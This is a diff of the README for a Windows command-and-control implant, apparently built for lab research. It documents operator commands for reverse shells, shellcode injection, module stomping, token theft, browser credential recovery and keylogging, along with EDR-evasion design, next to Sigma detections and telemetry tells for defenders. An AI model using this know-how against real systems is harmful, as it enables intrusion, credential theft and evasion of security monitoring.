@@ -12,8 +12,8 @@
 ![C2 Server](https://img.shields.io/badge/C2_Flask-3.x-3776AB?style=flat-square&logo=python&logoColor=white)
 ![Key exchange](https://img.shields.io/badge/Key_exchange-ECDH_P--256-6F42C1?style=flat-square)
 ![Cipher](https://img.shields.io/badge/Cipher-AES--256--GCM-8250DF?style=flat-square)
-![Protocol tests](https://img.shields.io/badge/Protocol_tests-27_checks-2EA043?style=flat-square)
-![CI](https://img.shields.io/badge/CI-2_jobs-8250DF?style=flat-square&logo=githubactions&logoColor=white)
+![Protocol tests](https://img.shields.io/badge/Protocol_tests-34_checks-2EA043?style=flat-square)
+![CI](https://img.shields.io/badge/CI-3_jobs-8250DF?style=flat-square&logo=githubactions&logoColor=white)
 ![Scope](https://img.shields.io/badge/Scope-Lab_only-C93A2B?style=flat-square)
 
 </div>
@@ -140,7 +140,7 @@ python server/c2_cli.py results <sid>
 ### 4 — Verify the channel
 
 ```bash
-python tests/test_protocol.py     # 27 end-to-end checks against a live server
+python tests/test_protocol.py     # 34 end-to-end checks against a live server
 ```
 
 ---
@@ -285,7 +285,7 @@ the implant adopts the new key within one beacon interval with no operator actio
 
 Each mechanism is isolated in one module so it can be enabled, disabled and measured independently.
 
-### Direct syscalls — `syscalls.cpp`
+### Direct and indirect syscalls — `syscalls.cpp`
 
 **Hell's Gate + Halo's Gate.** `ntdll.dll` is read **from disk** (bypassing the hooked in-memory
 copy), its PE export table is parsed, and syscall numbers are pulled out of stub bytes with the
@@ -302,21 +302,34 @@ ntdll can neither be read from disk nor mapped from the loaded module, or its ex
 parse. `WinMain` retries the initialization five times, five seconds apart, then lets the thread
 return so the supervisor restarts it.
 
-Stub bytes are an 11-byte `mov r10,rcx / mov eax,<ssn> / syscall / ret` written into a single
-`VirtualAlloc` pool that is flipped to `PAGE_EXECUTE_READ` and icache-flushed after the last stub
-lands. If the on-disk read fails, ntdll is mapped from the loaded module as a fallback view —
-visible hooks are then handled by Halo's Gate instead.
+Stub bytes are written into a single `VirtualAlloc` pool (32-byte aligned slots) that is
+flipped to `PAGE_EXECUTE_READ` and icache-flushed after the last stub lands. Each stub takes
+whichever form the resolver found: the direct 11-byte `mov r10,rcx / mov eax,<ssn> / syscall /
+ret`, or the indirect 21-byte form that replaces `syscall` with `mov r11,<addr> / jmp r11`
+aimed at a `syscall; ret` pair inside the **loaded** ntdll. The indirect form is preferred
+because the instruction then lives in Microsoft's own code instead of a private RX allocation;
+the scan looks in the target function's own stub first (its bytes sit past the entry point, so
+an entry-point hook still leaves the real `syscall; ret`), falls back to any clean pair in
+ntdll's `.text`, and degrades to the direct stub when neither exists — this path never fails a
+resolution. `r11` is caller-saved scratch under the x64 ABI, so no syscall argument register is
+clobbered, and because the trampoline jumps rather than calls, the `ret` inside ntdll returns
+straight to the original caller. If the on-disk read fails, ntdll is mapped from the loaded
+module as a fallback view — visible hooks are then handled by Halo's Gate instead.
 
 ### API and string resolution — `obfuscate.hpp`
 
 | Primitive | Effect |
 |---|---|
-| `XS("...")` / `XSW(L"...")` | Compile-time XOR-encrypted narrow/wide strings, decrypted on first use |
-| Rotating 4-byte key | `GHOST_K0..K3` — defeats single-byte XOR inversion by naive AV unmatchers; change before each build |
+| `XS("...")` / `XSW(L"...")` | Compile-time narrow/wide strings, each XORed with its own splitmix64 keystream and decrypted on first use |
+| Build salt + rotating key | `GHOST_SALT` / `GHOST_K0..K3` — feed every per-string seed: one recovered keystream decrypts exactly one string, and identical literals no longer share ciphertext; change both before each build |
 | `FNV("WinHttpOpen")` | Compile-time FNV-1a 32-bit hash — no API name strings in `.rdata` |
 | `HashProc` / `HASHPROC` | Resolves exports by walking the **PEB loader links**, not `GetProcAddress` |
 
-Net effect: `strings` on the binary yields no URLs, no API names and no PowerShell fragments.
+Net effect: a release artifact should yield no URLs, no API names, no PowerShell fragments and
+no build secrets to `strings` — and `tests/check_strings.py` checks that mechanically on every
+CI build, because whether each construction actually folds into rodata is a compiler
+optimisation rather than a language guarantee (see
+[known limitations](#18-known-limitations-and-scope)).
 
 ### Defense impairment — `evasion.cpp`
 
@@ -351,6 +364,14 @@ Net effect: `strings` on the binary yields no URLs, no API names and no PowerShe
   `NtQueueApcThread` between `NtSuspendThread` and `NtResumeThread`. The first thread that accepts
   the APC wins; the whole path returns failure cleanly if the three native thread syscalls did not
   resolve.
+- **Module stomping** (`!inject-stomp <pid> <hex> [dll]`): the target loads a signed System32 DLL
+  through a remote `LoadLibraryW` thread — the export is resolved by hash in our own kernel32 and
+  applied to the target's base by RVA, since kernel32 maps at the same offset in every process —
+  then the DLL's `.text` is flipped `RW → write → RX` and a thread starts at the module base. The
+  payload executes from an image-backed `PAGE_EXECUTE_READ` page of a Microsoft binary instead of
+  a private allocation, which is the artifact memory scanners key on. The write is copy-on-write:
+  the file on disk and every other process mapping it stay untouched. Default host is
+  `C:\Windows\System32\amsi.dll`; pick a DLL the target does not rely on afterwards.
 - **PPID spoofing**: `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` on `CreateProcessW` so a new process
   appears as the child of a legitimate long-running service host instead of the implant —
   `!migrate` uses it to parent a fresh copy of itself.
@@ -495,6 +516,7 @@ implant owns the shell state, so the working directory and `set` variables survi
 | `!files [path]` · `!getfile <path>` | Directory listing / pull a staged file through `/payload` |
 | `!inject <pid> <hex bytes>` | Load raw shellcode into a process via the direct-syscall remote-thread chain |
 | `!inject-apc <pid> <hex bytes>` | Same payload, delivered as an APC to one of the target's threads |
+| `!inject-stomp <pid> <hex bytes> [dll]` | Module stomping — payload runs from the `.text` of a signed System32 DLL loaded into the target (default `amsi.dll`), image-backed rather than private RX |
 | `!migrate [pid]` | Re-spawn the implant as a PPID-spoofed child of `pid` (default: a SYSTEM `svchost.exe`) and exit cleanly |
 | `steal_token` | Locates `winlogon.exe`, duplicates its primary token and impersonates SYSTEM (**no arguments**) |
 | `!reverse <ip[:port]>` | Reverse TCP shell; default port **4444** matches `c2_cli.py listen` |
@@ -556,7 +578,7 @@ server values route through one config dictionary.
 | `GHOST_BEACON_TOKEN` | Implant→server shared secret (server must match) | prompted; enter blank to generate and print a random one |
 | `GHOST_BEACON_MIN` / `GHOST_BEACON_MAX` | Jitter bounds, seconds (validated `3 ≤ min ≤ max`) | 18 / 24 |
 | `GHOST_C2_HOST` / `GHOST_C2_PORT` / `GHOST_BEACON_TOKEN_W` | Raw `-D` macros the script emits | set by `build.sh` |
-| `GHOST_K0..K3` (`obfuscate.hpp`) | Rotating XOR key — change per campaign build | `A7 3E C1 58` |
+| `GHOST_SALT`, `GHOST_K0..K3` (`obfuscate.hpp`) | Build salt + rotating key feeding the per-string keystream seed — change per campaign build | salt `5D3A9F17C4B28E60`, key `A7 3E C1 58` |
 | `CMD_OUTPUT_MAX` / `CMD_TIMEOUT_MS` | 65536 chars of text result before truncation / 30 s per command | `include/config.hpp` |
 | `MAX_FAILURES` / `BACKOFF_FACTOR` / `BACKOFF_MAX_SEC` | The live failure-backoff ladder in `BeaconFailureBackoff` (`src/c2.cpp`): 5 / 3 / 1800 s → 18, 54, 162, 486, then 1458 s held | `include/config.hpp` |
 
@@ -666,6 +688,7 @@ python server/c2_cli.py task <sid> "!vnc <operator-ip>:5500"
 | Command | Coverage |
 |---|---|
 | `python tests/test_protocol.py` | **34 checks** against a live server instance: ECDH handshake, encrypt/decrypt round trips with tricky payloads, task/result flow, `tid` delivery + ack, at-least-once retry, duplicate-result dedup, replay-counter rejection, re-handshake after server restart, and wire-Base64 canonicality against the implant's strict decoder |
+| `python tests/check_strings.py <exe> --secret <token> …` | Scans a release artifact for build secrets and for the strings that are supposed to be obfuscated — the mechanical check behind the "no plaintext in the binary" claim |
 | `powershell -File tests/test_browser.ps1` | `!browser` recovery logic against a **synthetic** profile in `%TEMP%` — one `v10` AES-GCM row and one legacy DPAPI row; no real browser data is read or touched |
 | `python tests/verify_chunks.py` | Asserts the XOR chunks embedded in `src/c2.cpp` reconstruct `tests/browser_dump.ps1` **byte-for-byte** |
 | `python tests/gen_browser_chunks.py` | Regenerates those chunks — run it after editing `browser_dump.ps1`, the PowerShell file is the single source of truth |
@@ -680,12 +703,16 @@ request with three jobs on `ubuntu-latest`:
 
 1. **Protocol tests** — Python 3.11, install `server/requirements.txt`, run `tests/test_protocol.py`.
 2. **Cross-compile** — install `mingw-w64`, build a release implant with placeholder values
-   (`ci-build.example.invalid`, non-operational token), then assert the artifact exists and is a
-   Windows PE via `file`.
+   (`ci-build.example.invalid`, non-operational token), assert the artifact exists and is a
+   Windows PE via `file`, then run `tests/check_strings.py` against it to prove the build-time
+   token, the C2 host and the protocol/payload strings did not survive in the clear.
 3. **Detection artifacts** — install `detections/requirements.txt`, run
    `detections/check_coverage.py`, which validates every Sigma rule and refuses to pass if a
    technique in the section 16 matrix is neither covered by a rule nor recorded as a known
-   telemetry gap.
+   telemetry gap. It also validates the collector's filter tags against the documented Sysmon
+   event table, so a plausible-looking mapping mistake (treating event id 22 as a file
+   download, or 25 as process access) fails CI instead of shipping a rule that silently never
+   fires.
 
 A green CI therefore means "the channel still behaves correctly", "the implant still builds
 warning-clean", and "the detection layer still accounts for itself", without any live implant
@@ -693,7 +720,7 @@ involved.
 
 ### Detection layer
 
-[`detections/`](detections/) holds the defensive half: a Sysmon collection profile, 19 Sigma
+[`detections/`](detections/) holds the defensive half: a Sysmon collection profile, 20 Sigma
 rules mapped to the section 16 matrix, and the coverage gate CI runs. Start with
 [`detections/README.md`](detections/README.md), which states plainly which techniques these rules
 cannot see and why.
@@ -715,10 +742,11 @@ reason it cannot be detected from Windows event telemetry.
 | Jittered beacon timing / scheduled transfer | [T1029](https://attack.mitre.org/techniques/T1029/) | `config.hpp`, `c2.cpp` |
 | Encrypted channel — symmetric + asymmetric | [T1573.001](https://attack.mitre.org/techniques/T1573/001/) · [T1573.002](https://attack.mitre.org/techniques/T1573/002/) | `utils.cpp`, `c2.cpp` |
 | Protocol / User-Agent impersonation | [T1001.001](https://attack.mitre.org/techniques/T1001/001/) | `c2.cpp` |
-| Direct syscalls (Hell's Gate, Halo's Gate) | [T1106](https://attack.mitre.org/techniques/T1106/) | `syscalls.cpp` |
+| Direct + indirect syscalls (Hell's Gate, Halo's Gate, ntdll `syscall; ret` reuse) | [T1106](https://attack.mitre.org/techniques/T1106/) | `syscalls.cpp` |
 | Obfuscated strings, hashed imports, stripped PE | [T1027](https://attack.mitre.org/techniques/T1027/) | `obfuscate.hpp`, `build.sh` |
 | Process injection (remote thread) | [T1055](https://attack.mitre.org/techniques/T1055/) | `injection.cpp` |
 | APC injection | [T1055.004](https://attack.mitre.org/techniques/T1055/004/) | `injection.cpp` |
+| Module stomping (image-backed shellcode) | [T1055](https://attack.mitre.org/techniques/T1055/) | `injection.cpp` |
 | Parent PID spoofing | [T1134.004](https://attack.mitre.org/techniques/T1134/004/) | `injection.cpp` |
 | Token duplication + impersonation (winlogon) | [T1134.001](https://attack.mitre.org/techniques/T1134/001/) | `c2.cpp` |
 | Registry Run key persistence (HKCU/HKLM) | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | `persistence.cpp` |
@@ -757,6 +785,7 @@ The point of the project. For each mechanism, the artifact a defender should be 
 | Image loaded from `%APPDATA%` with Microsoft version metadata | Sysmon EID 1 + `FileVersion`/`CompanyName` | Signed-metadata look without an Authenticode signature |
 | Process whose PEB path ≠ its real on-disk path | EDR process tree vs. filesystem correlation | Deliberate `ImagePathName` overwrite |
 | `CreateRemoteThread` / `NtCreateThreadEx` into `svchost`, `explorer`, `winlogon` | Sysmon EID 8, ETW `Microsoft-Windows-Kernel-Process` | Cross-process write + start is the injection signature |
+| A remote thread whose start address resolves into a module's `.text` rather than an exported entry, and an image-backed page flipped writable and back | EDR hook-integrity checks, ETW-TI `NtProtectVirtualMemory` tracing | Module stomping leaves Sysmon little that is distinctive (EID 8 fires, EID 7 shows the host DLL load); the code-page protection dance and the thread start at a module base are the kernel-side tells |
 | Remote allocation that lands `PAGE_READWRITE` and is then flipped to `PAGE_EXECUTE_READ` | ETW `Kernel-Processthread`, `NtProtectVirtualMemory` tracing | The write-then-protect dance in a **foreign** process is the injection signature; GDI/heap code does not do it |
 | Child process with an implausible parent (e.g. `cmd.exe` parented to `svchost.exe`) | Process-tree analytics | PPID spoofing changes only the claimed parent |
 | `amsi.dll` / `etw.dll` text-page modifications in a scanned process | EDR hook-integrity checks, `VirtualProtect` call tracing | Patched to `xor eax,eax; ret` / `ret` |
@@ -765,9 +794,12 @@ The point of the project. For each mechanism, the artifact a defender should be 
 | `schtasks.exe /Create /TN MicrosoftEdgeUpdateTaskUser` with `/RL HIGHEST` | Sysmon EID 1 command line | Task name mimics Edge but the action path is user-writable |
 | Run-key writes referencing `%APPDATA%` | Registry EID 12/13/14 | User-writable autostart target |
 | Beacon at a 18–24 s jitter with a `Microsoft-WNS/10.0` User-Agent | Network/egress telemetry, JA3 + SNI baselines | Real WNS traffic does not post encrypted JSON to an ngrok domain |
+| DNS lookup of a fresh tunnel domain from a non-browser process | Sysmon EID 22 (`DnsQuery`) + DNS logs | WinHTTP resolves in-process, so the query is attributed to the implant; the queried name changes per campaign, the querying image does not |
 | High-entropy short POST bodies to a new tunnel domain at a fixed cadence | DNS + proxy logs, TLS SNI | Randomized ciphertext + regular intervals ≈ C2 |
 | `SetThreadExecutionState` from an unsigned GUI-subsystem binary | ETW / API monitoring | Sleep evasion in a "update service" helper |
 | Debug registers cleared (`Dr7 = 0`) on a new thread | EDR anti-debug telemetry | Anti-instrumentation |
+| A `syscall` instruction inside ntdll whose caller never passed through ntdll's entry point | ETW-TI, kernel callbacks, stack-integrity sensors | The stub jumps into ntdll's own `syscall; ret`, but the return address on the stack points at the trampoline's private RX page, not at a signed module — the unbacked frame is the tell |
+| Chunks of the embedded PowerShell script in cleartext | `strings` / YARA against the binary; Sysmon EID 1 command line once the script runs | If the compiler did not fold an `XSW` construction, the payload survives in `.rdata`; `tests/check_strings.py` is the build-time tripwire for exactly this |
 | `WH_KEYBOARD_LL` hook installed by an unfamiliar process | ETW / hook enumeration | Keylogging without a product purpose |
 | `winsqlite3.dll` loaded by an Office/update-looking binary, reading `Login Data` | Sysmon EID 7 (image load) + 11 | Stock-Windows credential theft path — no dropped tools |
 | `DPAPI` `CryptUnprotectData` calls in an unusual process | ETW `Microsoft-Windows-Crypto-DPAPI` | Master-key unwrap should be rare and attributable |
@@ -783,13 +815,15 @@ Documented deliberately — these are part of the thesis, not bugs to hide.
 | Limitation | Detail |
 |---|---|
 | **Server identity is not authenticated** | The handshake authenticates the *beacon token*, not the server, and WinHTTP is deliberately configured with `SECURITY_FLAG_IGNORE_UNKNOWN_CA`, `_CERT_DATE_INVALID`, `_CERT_WRONG_USAGE` and `_CERT_CN_INVALID` — so an active HTTPS-MITM in front of the server can interpose. Channel encryption defends against passive observers and the tunnel provider, not an active adversary. Certificate pinning is on the [roadmap](#22-roadmap). |
-| Ephemeral XOR key | The rotating 4-byte key is a compile-time constant; anyone with the source can decrypt sample strings. It raises the bar for automated matching, not for a human analyst. |
+| String obfuscation is compile-time and folding-dependent | Every literal now has its own splitmix64 keystream (build salt ⊕ rotating key ⊕ call-site id), so single-key inversion and identical-ciphertext grouping both fail. But the scheme lives entirely in the binary's logic, and whether a given site actually avoids the binary depends on the compiler folding the constexpr construction — an optimisation, not a language guarantee. `tests/check_strings.py` scans every release artifact in CI and fails on any surviving plaintext string. |
+| Indirect syscalls hide the instruction, not the call | The trampoline jumps into ntdll's own `syscall; ret`, so the instruction location is legitimate and, when the target stub is intact, the SSN in `eax` matches the stub it executes from. The return address on the stack still points into the trampoline's private RX page rather than a signed module; kernel callbacks and ETW-TI see every syscall regardless, and call-stack spoofing is not implemented. |
 | **In-memory state only** | No database: restarting the server discards sessions, results, task queues, audit trail and the staged payload. The re-handshake path recovers agents, not history. |
 | No asymmetric operator auth | The operator token is a shared bearer secret over the dashboard/CLI; there is no per-user identity, so the audit trail attributes actions to tokens and IPs, not people. |
 | Token stealing is `winlogon`-specific | `steal_token` targets `winlogon.exe` by name and needs the privileges to open it; on non-elevated runs it fails rather than degrading. |
 | Chrome app-bound encryption | Chrome ≥ 127 `v20` blobs are detected and reported as **not recoverable**; Edge is unaffected. This is an honest scope boundary, not a defect. |
 | Windows-only, x64-only | Syscall stubs use `4C 8B D1 B8` (x64) patterns; no ARM64 or 32-bit support, no cross-platform implant. |
 | AMSI/ETW patching is per-process | It silences in-process reporting for the implant only; it does not disable system-wide EDR telemetry, and modern EDRs detect the patch itself. |
+| Module stomping damages the host module | The overwritten `.text` is not restored, so the target must not call into that DLL afterwards, and the payload thread starts at a module base rather than an exported entry point — both are EDR heuristics. Sysmon sees the remote `LoadLibraryW` (EID 8/10) but not the stomp itself. |
 | Beacon cadence is a signature | Jitter hides fixed intervals from naive thresholds but the 18–24 s volume and cadence remain highly regular. Rapid-poll shell mode (1 s) is trivially visible on the wire. |
 | Manual enrollment is optional | `--auto-accept` accepts every agent that presents the beacon token — convenient in a lab, unsafe anywhere a token could leak. |
 
@@ -835,11 +869,11 @@ ghostimplant/
 │   └── vnc.hpp             reverse-VNC server interface
 ├── src/
 │   ├── main.cpp        (374)   entry, PEB spoof, self-install, supervisor, startup order
-│   ├── c2.cpp          (1962)  transport, ECDH/AES, beacon loop, command table, all handlers
+│   ├── c2.cpp          (2204)  transport, ECDH/AES, beacon loop, command table, all handlers
 │   ├── utils.cpp       (466)   AES-GCM + ECDH via BCrypt, base64, SHA-256, system info, jitter
 │   ├── vnc.cpp         (415)   reverse RFB 3.3 server, tile diffing, SendInput replay
-│   ├── syscalls.cpp    (364)   Hell's Gate + Halo's Gate, trampoline stubs
-│   ├── injection.cpp   (347)   remote-thread + APC chains, PPID spoofing
+│   ├── syscalls.cpp    (438)   Hell's Gate + Halo's Gate, direct + indirect trampolines
+│   ├── injection.cpp   (591)   remote-thread + APC + module-stomping chains, PPID spoofing
 │   ├── evasion.cpp     (347)   AMSI/ETW patching, HWBP clear, sandbox, Defender exclusion, wake lock
 │   ├── persistence.cpp (327)   three install vectors + symmetric removal
 │   └── keylog.cpp      (121)   WH_KEYBOARD_LL hook + circular buffer
@@ -849,13 +883,18 @@ ghostimplant/
 │   ├── requirements.txt
 │   └── ghost-c2.service        systemd unit for lab-VPS hosting
 ├── tests/
-│   ├── test_protocol.py        27 end-to-end channel checks
+│   ├── test_protocol.py        34 end-to-end channel checks
+│   ├── check_strings.py        release-artifact plaintext scan (CI)
 │   ├── browser_dump.ps1        source of truth for the embedded recovery script
 │   ├── gen_browser_chunks.py   PowerShell → XSW chunks in c2.cpp
 │   ├── verify_chunks.py        chunk ↔ script byte equality
 │   └── test_browser.ps1        synthetic-profile recovery test
 ├── resources/                  PE version resource, manifest, prank wallpaper
-├── .github/workflows/ci.yml    protocol tests + MinGW cross-compile
+├── detections/
+│   ├── check_coverage.py       coverage gate (CI job 3)
+│   ├── sigma/                  19 rules, one per documented behaviour
+│   └── sysmon/                 sysmon-ghost.xml collection profile
+├── .github/workflows/ci.yml    protocol tests + MinGW cross-compile + detection gate
 └── build.sh                    cross-compile, strip, timestamp randomization
 ```
 
